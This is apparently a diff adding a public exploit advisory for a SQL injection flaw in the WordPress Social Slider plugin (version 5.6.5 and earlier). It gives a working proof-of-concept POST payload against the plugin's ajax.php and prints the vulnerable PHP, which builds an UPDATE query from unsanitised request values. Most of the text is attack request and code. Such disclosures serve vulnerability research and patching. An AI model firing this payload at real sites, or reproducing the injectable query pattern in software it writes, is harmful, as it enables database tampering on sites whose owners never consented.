@@ -1,0 +1,33 @@
+# Exploit Title: Social Slider <= 5.6.5 SQL Injection Vulnerability
+# Date: 2011-08-05
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/social-slider-2.zip
+# Version: 5.6.5 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/social-slider-2/ajax.php
+ action=ZapiszPozycje&rA[]=1 AND SLEEP(5)
+
+---------------
+Vulnerable code
+---------------
+<?php 
+require_once(dirname(__FILE__).'/../../../wp-config.php');
+global $wpdb, $table_prefix;
+
+$SocialSliderArray = $_POST['rA'];
+
+if (mysql_real_escape_string($_POST['action']) == "ZapiszPozycje")
+    {
+    $lC = 1;
+    foreach ($SocialSliderArray as $recordIDValue)
+        {
+        $query = "UPDATE ".$table_prefix."socialslider SET lp = ".$lC." WHERE id = ".$recordIDValue;
+        mysql_query($query);
+        $lC = $lC + 1;    
+        }
+    }
+?>
+
